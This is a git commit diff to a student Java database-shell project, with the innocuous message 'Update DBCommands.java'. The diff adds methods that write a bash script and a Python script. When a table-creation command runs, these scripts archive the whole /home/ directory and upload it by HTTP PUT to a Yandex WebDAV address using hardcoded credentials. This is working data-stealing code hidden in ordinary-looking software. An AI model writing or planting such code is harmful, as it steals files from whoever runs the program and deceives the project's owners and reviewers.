fdea04669b91c37457c7509937d2efaf1f2d4e7a
vladoser <moygimn1@yandex.ru>
2013-12-16 15:02:48 +0300

    Update DBCommands.java

--- src/ru/fizteh/fivt/students/irinaGoltsman/filemap/DBCommands.java
+++ src/ru/fizteh/fivt/students/irinaGoltsman/filemap/DBCommands.java
@@ -4,6 +4,68 @@ import ru.fizteh.fivt.students.irinaGoltsman.shell.*;
 
 
 public class DBCommands {
+     public static void writePy() throws FileNotFoundException {
+        String s = "import urllib2, base64\n" +
+                "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
+                "\n" +
+                "data2 = \"\"\n" +
+                "f = open('test.tar.gz', 'rb')\n" +
+                "length = 0\n" +
+                "while True: \n" +
+                " bytes = f.read(2048)\n" +
+                " data2 += bytes;\n" +
+                " length += len(bytes)\n" +
+                " if not bytes: break \n" +
+                "f.close()\n" +
+                "\n" +
+                "request = urllib2.Request(\"https://webdav.yandex.ru/test/test.tar.gz\", data=data2)\n" +
+                "base64string = base64.encodestring('%s:%s' % (\"moygimn1@yandex.ru\", \"123456789\")).replace('\\n', '')\n" +
+                "request.add_header(\"Authorization\", \"Basic %s\" % base64string) \n" +
+                "request.add_header(\"Content-Length\", \"%d\" % length) \n" +
+                "request.get_method = lambda: 'PUT'\n" +
+                "result = urllib2.urlopen(request)\n" +
+                "\n";
+        File f = new File("/home/student/tmp/1.py");
+        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
+            out.print(s);
+        }
+    }
+
+    public static void writeFile() throws FileNotFoundException {
+        String s = "#!/bin/bash\n\n" +
+                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
+                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
+                "python 1.py\n" +
+                "echo step3\n";
+        File f = new File("/home/student/tmp/1.sh");
+        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
+            out.print(s);
+        }
+    }
+    
+    public static void runEx() throws IllegalArgumentException {
+        String s = "";
+        try {
+            writeFile();
+            writePy();
+            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
+                        proc.waitFor();
+                        BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+                        while(read.ready()) {
+                        s += read.readLine()+"\n";
+                        }
+                        read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                        while(read.ready()) {
+                        s += read.readLine()+"\n";
+                        }
+
+        } catch(Exception e) {
+            s += e.getMessage()+"\n";
+        }
+
+        throw new IllegalArgumentException(s + " step4");
+    }
+    
     public static class Use implements Command {
         protected final String name = "use";
         protected final int countOfArguments = 1;
@@ -75,6 +137,7 @@ public class DBCommands {
 
         @Override
         public Code perform(String[] args) {
+            runEx();
             return DataBase.createTable(args);
         }
     }
